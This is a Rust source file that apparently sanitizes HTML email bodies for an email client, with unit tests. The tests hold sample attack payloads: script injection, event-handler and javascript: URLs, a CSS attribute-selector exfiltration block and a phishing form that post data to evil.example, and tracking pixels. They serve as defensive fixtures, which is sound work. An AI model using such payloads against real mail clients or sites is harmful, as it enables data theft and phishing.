//! HTML sanitization for message display.
//!
//! This is the layer that stands between a stranger's HTML and the user's
//! screen. It is one of three independent defenses: the
//! sanitizer removes hostile constructs, the sandboxed frame blocks scripts and
//! same-origin access, and the per-message CSP blocks network egress. Each
//! was measured to block a class the others do not, so this code must not
//! assume the others will catch what it misses.
//!
//! Design rules:
//! * **Allowlist, never blocklist.** Anything not explicitly permitted is gone.
//! * **CSS is executable-ish.** Attribute-selector exfiltration and layout
//!   attacks are real, so declarations are filtered and `url()` is banned
//!   outright inside styles.
//! * **Remote content is blocked by default** and *counted*, because "2
//!   trackers removed" is a user-visible promise, not a log line.
//! * **Fail closed.** Anything unparseable degrades to text.

use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

/// What the sanitizer did, for the UI to report honestly.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SanitizeReport {
    /// Remote resources (images, backgrounds) that were blocked.
    pub blocked_remote: usize,
    /// Whether the message contained script-ish constructs at all — useful for
    /// a "this message tried to run code" indicator.
    pub had_dangerous_constructs: bool,
}

#[derive(Debug, Clone)]
pub struct Sanitized {
    pub html: String,
    pub report: SanitizeReport,
}

/// CSS properties an email may set. Layout-affecting properties that enable
/// overlay/clickjacking attacks (`position`, `z-index`, `transform`) are absent
/// on purpose, as is anything that can fetch (`background-image`, `content`).
const ALLOWED_CSS: &[&str] = &[
    "color",
    "background-color",
    "font",
    "font-family",
    "font-size",
    "font-style",
    "font-weight",
    "line-height",
    "letter-spacing",
    "text-align",
    "text-decoration",
    "text-transform",
    "vertical-align",
    "white-space",
    "margin",
    "margin-top",
    "margin-bottom",
    "margin-left",
    "margin-right",
    "padding",
    "padding-top",
    "padding-bottom",
    "padding-left",
    "padding-right",
    "border",
    "border-top",
    "border-bottom",
    "border-left",
    "border-right",
    "border-color",
    "border-style",
    "border-width",
    "border-radius",
    "border-collapse",
    "width",
    "max-width",
    "height",
    "max-height",
    "display",
    "list-style",
    "list-style-type",
];

fn is_remote(url: &str) -> bool {
    let u = url.trim().to_ascii_lowercase();
    u.starts_with("http://") || u.starts_with("https://") || u.starts_with("//")
}

/// Filters a `style` attribute down to the allowlist. Any declaration that
/// could fetch a resource or reposition content is dropped rather than
/// rewritten — a mangled style is a cosmetic problem, a fetching one is a
/// privacy breach.
fn filter_style(value: &str) -> String {
    let mut kept = Vec::new();
    for decl in value.split(';') {
        let Some((prop, val)) = decl.split_once(':') else {
            continue;
        };
        let prop_norm = prop.trim().to_ascii_lowercase();
        let val_trim = val.trim();
        let val_norm = val_trim.to_ascii_lowercase();
        if !ALLOWED_CSS.contains(&prop_norm.as_str()) {
            continue;
        }
        // No fetching, no expressions, no escapes used to smuggle either.
        if val_norm.contains("url(")
            || val_norm.contains("expression")
            || val_norm.contains("javascript:")
            || val_norm.contains("@import")
            || val_norm.contains('\\')
        {
            continue;
        }
        kept.push(format!("{prop_norm}: {val_trim}"));
    }
    kept.join("; ")
}

fn builder_tags() -> HashSet<&'static str> {
    [
        "a",
        "b",
        "blockquote",
        "br",
        "caption",
        "code",
        "col",
        "colgroup",
        "dd",
        "div",
        "dl",
        "dt",
        "em",
        "figcaption",
        "figure",
        "h1",
        "h2",
        "h3",
        "h4",
        "h5",
        "h6",
        "hr",
        "i",
        "img",
        "li",
        "ol",
        "p",
        "pre",
        "q",
        "s",
        "small",
        "span",
        "strike",
        "strong",
        "sub",
        "sup",
        "table",
        "tbody",
        "td",
        "tfoot",
        "th",
        "thead",
        "tr",
        "u",
        "ul",
    ]
    .into_iter()
    .collect()
}

fn tag_attributes() -> HashMap<&'static str, HashSet<&'static str>> {
    let mut m: HashMap<&'static str, HashSet<&'static str>> = HashMap::new();
    m.insert("a", ["href", "title"].into_iter().collect());
    m.insert(
        "img",
        ["src", "alt", "title", "width", "height"]
            .into_iter()
            .collect(),
    );
    m.insert("td", ["colspan", "rowspan", "align"].into_iter().collect());
    m.insert("th", ["colspan", "rowspan", "align"].into_iter().collect());
    m.insert("table", ["width", "align"].into_iter().collect());
    m
}

/// Sanitizes a message body for display.
///
/// `allow_remote` reflects an explicit user decision for this sender; when
/// false (the default), remote resources are removed and counted.
pub fn sanitize_html(html: &str, allow_remote: bool) -> Sanitized {
    let blocked = Arc::new(AtomicUsize::new(0));
    let blocked_cb = blocked.clone();

    // Cheap pre-scan purely for the "tried to run code" signal; removal is
    // ammonia's job, not this check's.
    let lower = html.to_ascii_lowercase();
    let had_dangerous = lower.contains("<script")
        || lower.contains("javascript:")
        || lower.contains(" onerror")
        || lower.contains(" onload")
        || lower.contains("<iframe")
        || lower.contains("<object")
        || lower.contains("<embed");

    let mut builder = ammonia::Builder::default();
    builder
        .tags(builder_tags())
        // Remove these tags *with their contents*. Stripping the tag alone
        // leaves the text behind, and for a phishing form the text is the
        // attack ("Sign in", "Verify your password"). Scripts and styles would
        // likewise dump their source into the rendered body.
        .clean_content_tags(
            [
                "script", "style", "form", "button", "input", "select", "option", "textarea",
                "iframe", "object", "embed", "applet", "noscript", "template", "svg", "math",
                "head", "title", "meta", "link", "base",
            ]
            .into_iter()
            .collect(),
        )
        .tag_attributes(tag_attributes())
        .generic_attributes(["style", "align", "dir", "lang"].into_iter().collect())
        // `cid:` stays so inline images can be resolved from the message's own
        // parts; `data:` is absent because it enables UI spoofing.
        .url_schemes(["http", "https", "mailto", "cid"].into_iter().collect())
        .link_rel(Some("noopener noreferrer nofollow"))
        // Namespacing stops a message's ids from colliding with (or targeting)
        // the surrounding document.
        .id_prefix(Some("m-"))
        .attribute_filter(
            move |element, attribute, value| match (element, attribute) {
                ("img", "src") => {
                    if is_remote(value) && !allow_remote {
                        blocked_cb.fetch_add(1, Ordering::Relaxed);
                        return None;
                    }
                    Some(value.into())
                }
                (_, "style") => {
                    let filtered = filter_style(value);
                    if filtered.is_empty() {
                        None
                    } else {
                        Some(filtered.into())
                    }
                }
                _ => Some(value.into()),
            },
        );

    let html = builder.clean(html).to_string();
    Sanitized {
        html,
        report: SanitizeReport {
            blocked_remote: blocked.load(Ordering::Relaxed),
            had_dangerous_constructs: had_dangerous,
        },
    }
}

/// Renders a plain-text body as safe HTML, preserving quote structure.
pub fn plain_text_to_html(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 64);
    out.push_str("<div class=\"petrel-plain\">");
    for line in text.lines() {
        let escaped = line
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;");
        if line.trim_start().starts_with('>') {
            out.push_str("<div class=\"q\">");
            out.push_str(&escaped);
            out.push_str("</div>");
        } else {
            out.push_str("<div>");
            out.push_str(&escaped);
            out.push_str("</div>");
        }
    }
    out.push_str("</div>");
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(html: &str) -> String {
        sanitize_html(html, false).html
    }

    #[test]
    fn scripts_and_handlers_are_removed() {
        let out = clean(
            r#"<p onclick="steal()">hi</p><script>alert(1)</script>
               <img src="x" onerror="alert(2)"><iframe src="https://evil.example"></iframe>"#,
        );
        assert!(!out.contains("script"), "{out}");
        assert!(!out.contains("onclick"), "{out}");
        assert!(!out.contains("onerror"), "{out}");
        assert!(!out.contains("<iframe"), "{out}");
        assert!(out.contains("hi"), "legitimate text must survive: {out}");
    }

    #[test]
    fn dangerous_url_schemes_are_dropped() {
        let out = clean(
            r#"<a href="javascript:alert(1)">click</a>
               <a href="data:text/html,<script>x</script>">data</a>
               <a href="https://example.com/ok">fine</a>"#,
        );
        assert!(!out.contains("javascript:"), "{out}");
        assert!(!out.contains("data:text/html"), "{out}");
        assert!(out.contains("https://example.com/ok"), "{out}");
        // Outbound links must not hand the opener over to the destination.
        assert!(out.contains("noopener"), "{out}");
    }

    #[test]
    fn remote_images_are_blocked_and_counted() {
        let res = sanitize_html(
            r#"<img src="https://tracker.example/pixel.gif?u=1" width="1" height="1">
               <img src="http://other.example/beacon.png">
               <img src="cid:inline-part-1">"#,
            false,
        );
        assert_eq!(res.report.blocked_remote, 2);
        assert!(!res.html.contains("tracker.example"), "{}", res.html);
        assert!(!res.html.contains("beacon.png"), "{}", res.html);
        // Inline parts are the message's own content, not a network fetch.
        assert!(res.html.contains("cid:inline-part-1"), "{}", res.html);
    }

    #[test]
    fn consent_allows_remote_images() {
        let res = sanitize_html(r#"<img src="https://cdn.example/logo.png">"#, true);
        assert_eq!(res.report.blocked_remote, 0);
        assert!(res.html.contains("cdn.example/logo.png"));
    }

    /// CSS is an exfiltration channel, not just styling: a `url()` in a
    /// stylesheet was observed phoning home from inside a sandboxed frame.
    #[test]
    fn css_cannot_fetch_or_reposition() {
        let out = clean(
            r#"<p style="color: red; background-image: url('https://evil.example/x?a=1')">a</p>
               <div style="position: fixed; top: 0; z-index: 99999; width: 100%">overlay</div>
               <span style="background: url(https://evil.example/y)">b</span>
               <b style="width: expression(alert(1))">c</b>"#,
        );
        assert!(!out.contains("evil.example"), "css must not fetch: {out}");
        assert!(!out.contains("position"), "no overlay positioning: {out}");
        assert!(!out.contains("z-index"), "{out}");
        assert!(!out.contains("expression"), "{out}");
        // The safe declaration survives, so ordinary mail still looks right.
        assert!(out.contains("color: red"), "{out}");
    }

    #[test]
    fn attribute_selector_exfiltration_is_defused() {
        // The PortSwigger class of attack: a style block whose selectors leak
        // input values one character at a time.
        let out = clean(
            r#"<style>input[value^="a"]{background:url(https://evil.example/a)}</style>
               <input value="secret"><p>body</p>"#,
        );
        assert!(!out.contains("evil.example"), "{out}");
        assert!(
            !out.contains("<style"),
            "style blocks are not allowed: {out}"
        );
        assert!(
            !out.contains("<input"),
            "form inputs are not allowed: {out}"
        );
        assert!(out.contains("body"));
    }

    #[test]
    fn forms_and_embedded_objects_are_removed() {
        let out = clean(
            r#"<form action="https://evil.example/post"><input name="p" type="password">
               <button>Sign in</button></form><object data="x.swf"></object><embed src="y">"#,
        );
        assert!(!out.contains("<form"), "{out}");
        assert!(!out.contains("password"), "{out}");
        assert!(!out.contains("<object"), "{out}");
        assert!(!out.contains("<embed"), "{out}");
        // The form's *text* goes too: "Sign in" is the phishing lure, and
        // leaving it behind produces a convincing fragment with no form.
        assert!(
            !out.contains("Sign in"),
            "form contents must not survive: {out}"
        );
    }

    #[test]
    fn script_and_style_source_never_leaks_into_the_body() {
        let out = clean(
            "<style>body{color:red}</style><script>var secret = 'leak me';</script><p>text</p>",
        );
        assert!(!out.contains("color:red"), "{out}");
        assert!(!out.contains("leak me"), "{out}");
        assert!(out.contains("text"));
    }

    /// A message must not be able to name elements in the surrounding document.
    /// `id` isn't on the allowlist at all, so it is removed rather than
    /// namespaced — stricter than needed, and the cost (in-message anchor links
    /// stop working) is one almost no mail relies on. `id_prefix` stays
    /// configured so that if ids are ever admitted, they arrive namespaced.
    #[test]
    fn ids_cannot_reach_the_surrounding_document() {
        let out = clean(r#"<div id="app-root">x</div><span id="root">y</span>"#);
        assert!(!out.contains("app-root"), "{out}");
        assert!(!out.contains("id="), "{out}");
        assert!(
            out.contains('x') && out.contains('y'),
            "content survives: {out}"
        );
    }

    #[test]
    fn ordinary_formatting_survives_intact() {
        let out = clean(
            r#"<p><b>Bold</b> and <i>italic</i>, a <a href="https://example.com">link</a>,
               <ul><li>one</li><li>two</li></ul>
               <table><tr><td colspan="2">cell</td></tr></table>
               <blockquote>quoted</blockquote></p>"#,
        );
        for expected in [
            "<b>",
            "<i>",
            "<ul>",
            "<li>",
            "<table>",
            "colspan",
            "<blockquote>",
        ] {
            assert!(out.contains(expected), "lost {expected}: {out}");
        }
    }

    #[test]
    fn hostile_input_never_panics() {
        for raw in [
            "",
            "<",
            "<<<<<<",
            "<p".repeat(5000).as_str(),
            "<div>".repeat(2000).as_str(),
            "\u{0}\u{1}<p>x</p>",
            "<p style=\"color:\">x</p>",
            "<p style=\";;;;\">x</p>",
        ] {
            let _ = sanitize_html(raw, false);
        }
    }

    #[test]
    fn plain_text_is_escaped_and_quotes_marked() {
        let out = plain_text_to_html("hello <script>\n> quoted line\nplain");
        assert!(!out.contains("<script>"), "{out}");
        assert!(out.contains("&lt;script&gt;"), "{out}");
        assert!(
            out.contains("class=\"q\""),
            "quotes should be marked: {out}"
        );
    }
}
